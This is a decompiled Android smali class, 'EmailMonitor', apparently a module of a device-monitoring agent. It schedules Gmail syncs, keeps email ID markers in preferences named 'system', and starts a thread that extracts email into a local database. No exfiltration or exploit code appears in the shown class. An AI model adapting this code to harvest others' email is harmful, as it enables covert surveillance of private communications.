.class public Lcom/hp/vd/module/monitor/EmailMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "EmailMonitor.java"


# static fields
.field public static final ATTRIBUTE_MAX_ID_PREFIX:Ljava/lang/String; = "max_id_"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "gmail_sync_interval"

.field protected static final TAG:Ljava/lang/String; = "EmailMonitor"


# instance fields
.field protected emailDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/EmailData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected extractorThread:Ljava/lang/Thread;

.field protected initialExtractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 77
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 83
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 84
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->emailDao:Lcom/j256/ormlite/dao/Dao;

    .line 85
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 87
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    .line 88
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    .line 90
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    .line 237
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->emailDao:Lcom/j256/ormlite/dao/Dao;

    if-eqz v0, :cond_0

    const/4 v0, 0x0

    .line 238
    iput-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->emailDao:Lcom/j256/ormlite/dao/Dao;

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 96
    const-class v0, Lcom/hp/vd/data/EmailData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 113
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 115
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 116
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 117
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 118
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x6

    .line 119
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v6.0"

    .line 120
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 122
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "gmail_sync_interval"

    const-string v2, "3450"

    .line 127
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/4 v1, 0x5

    .line 129
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 130
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 132
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "EmailMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 470
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 471
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 472
    iget-object v2, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "gmail_sync_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 474
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 478
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 9

    .line 140
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 143
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->emailDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_2

    .line 159
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 165
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "system"

    .line 167
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 165
    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 170
    invoke-interface {v2}, Landroid/content/SharedPreferences;->getAll()Ljava/util/Map;

    move-result-object v3

    .line 172
    invoke-interface {v3}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :cond_0
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_1

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/util/Map$Entry;

    .line 174
    invoke-interface {v5}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/String;

    const-string v7, "max_id_"

    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 175
    iget-object v6, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 176
    invoke-interface {v5}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    .line 177
    invoke-interface {v5}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    .line 175
    invoke-virtual {v6, v7, v8}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v6, "EmailMonitor"

    .line 180
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Loaded (after update) "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v5}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, "="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v5}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v0, v6, v5}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    goto :goto_0

    .line 184
    :cond_1
    iget-object v4, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v4}, Lcom/hp/vd/module/monitor/EmailMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v4

    if-nez v4, :cond_2

    const-string v2, "EmailMonitor"

    const-string v3, "Could not persist copied attributes (from shared preferences) to moduleData"

    const/4 v4, 0x3

    .line 185
    invoke-interface {v0, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_2

    .line 199
    :cond_2
    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 201
    invoke-interface {v3}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    move-result-object v3

    invoke-interface {v3}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :cond_3
    :goto_1
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_4

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/util/Map$Entry;

    .line 202
    invoke-interface {v4}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/String;

    const-string v6, "max_id_"

    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    const-string v5, "EmailMonitor"

    .line 203
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "About to delete shared va (as it is already in the moduleData) key="

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-interface {v4}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v5, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 205
    invoke-interface {v4}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    invoke-interface {v2, v4}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    goto :goto_1

    .line 209
    :cond_4
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception v2

    const-string v3, "EmailMonitor"

    const-string v4, "initialize(): could not load persisted module data."

    .line 213
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 223
    :goto_2
    :try_start_2
    iget-object v2, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_1

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v2

    const-string v3, "EmailMonitor"

    const-string v4, "initialize(): cannot get moduleDao."

    .line 226
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_2
    move-exception v2

    const-string v3, "EmailMonitor"

    const-string v4, "(NullPointerException) Could not create Dao."

    .line 153
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_3
    move-exception v2

    const-string v3, "EmailMonitor"

    const-string v4, "Could not create Dao."

    .line 146
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 0

    .line 102
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x32

    .line 106
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/EmailMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 2

    .line 351
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    const/4 v1, 0x0

    if-nez v0, :cond_0

    return v1

    .line 355
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_2

    :cond_1
    const/4 v1, 0x1

    :cond_2
    return v1
.end method

.method public start()Z
    .locals 8

    .line 290
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v4

    const-string v0, "EmailMonitor"

    const-string v1, "start() called."

    .line 291
    invoke-interface {v4, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 293
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->isActivated()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    const-string v0, "EmailMonitor"

    const-string v2, "start(): This module is currently DEactivated."

    .line 294
    invoke-interface {v4, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v1

    .line 299
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->hasUpdateIntervalExpired()Z

    move-result v0

    const/4 v7, 0x1

    if-ne v0, v7, :cond_1

    const-string v0, "EmailMonitor"

    const-string v1, "start(): interval has not yet expired."

    .line 300
    invoke-interface {v4, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v7

    .line 305
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "EmailMonitor"

    const-string v2, "start(): Extractor thread is currently running. Exiting..."

    .line 306
    invoke-interface {v4, v0, v2, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    .line 311
    :cond_2
    new-instance v0, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->context:Lcom/hp/vd/context/Context;

    .line 312
    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->emailDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/email/MultiversionEmailLister;-><init>(Landroid/content/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;)V

    .line 320
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Email-Extractor-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    .line 321
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 3

    .line 247
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 253
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "EmailMonitor"

    const-string v2, "This module is currently DEactivated."

    .line 254
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    .line 329
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 338
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 341
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 342
    iget-object v0, p0, Lcom/hp/vd/module/monitor/EmailMonitor;->initialExtractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 10

    .line 366
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "EmailMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 368
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v1, 0x3

    const/4 v2, 0x0

    .line 382
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1

    if-nez p1, :cond_0

    const-string p1, "EmailMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 395
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 408
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v3, "system"

    .line 410
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/EmailMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 408
    invoke-virtual {v1, v3, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 413
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 419
    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const-string v3, ";"

    .line 420
    invoke-virtual {p1, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object p1

    const/4 v3, 0x1

    if-eqz p1, :cond_4

    .line 422
    array-length v4, p1

    if-nez v4, :cond_1

    goto :goto_1

    .line 429
    :cond_1
    :try_start_1
    array-length v4, p1

    move v5, v2

    :goto_0
    if-ge v5, v4, :cond_3

    aget-object v6, p1, v5

    const-string v7, "EmailMonitor"

    .line 430
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "Checking attribute (key/value): "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-interface {v0, v7, v8}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v7, "max_id_"

    .line 432
    invoke-virtual {v6, v7}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v7

    if-eqz v7, :cond_2

    const-string v7, "="

    .line 433
    invoke-virtual {v6, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_2

    .line 435
    array-length v7, v6

    const/4 v8, 0x2

    if-ne v7, v8, :cond_2

    .line 436
    aget-object v7, v6, v2

    .line 438
    aget-object v8, v6, v3

    invoke-interface {v1, v7, v8}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    if-eqz v0, :cond_2

    const-string v7, "EmailMonitor"

    .line 444
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "update(): persisted va (from old module): "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v9, v6, v2

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v6, v6, v3

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-interface {v0, v7, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :cond_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 465
    :cond_3
    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result p1

    return p1

    :catch_0
    move-exception p1

    const-string v1, "EmailMonitor"

    const-string v2, "update(): exception caught while preserving old module attribute (gather_on_start)"

    .line 451
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v3

    :cond_4
    :goto_1
    const-string p1, "EmailMonitor"

    const-string v1, "update(): no attributes found from the previous module instance"

    .line 423
    invoke-interface {v0, p1, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v3

    :catch_1
    const-string p1, "EmailMonitor"

    const-string v3, "Could not load the persistedModuleData from the old module we are currently upgrading."

    .line 385
    invoke-interface {v0, p1, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2
.end method
